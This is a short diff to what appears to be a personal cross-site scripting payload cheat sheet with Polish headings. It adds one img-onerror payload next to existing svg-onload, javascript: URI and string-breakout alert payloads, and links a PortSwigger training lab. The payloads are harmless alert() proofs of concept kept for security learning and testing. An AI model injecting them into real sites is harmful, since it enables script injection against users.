@@ -1,6 +1,7 @@
 "><svg onload=alert(1)>
 <img src=1 onerror=alert(1)>
 javascript:alert('You are hacked!')
+<><img src=1 onerror=alert(1)>
 
 [Wstrzykciecie w srodku zmiennej]
 '-alert(1)-'                          (https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)
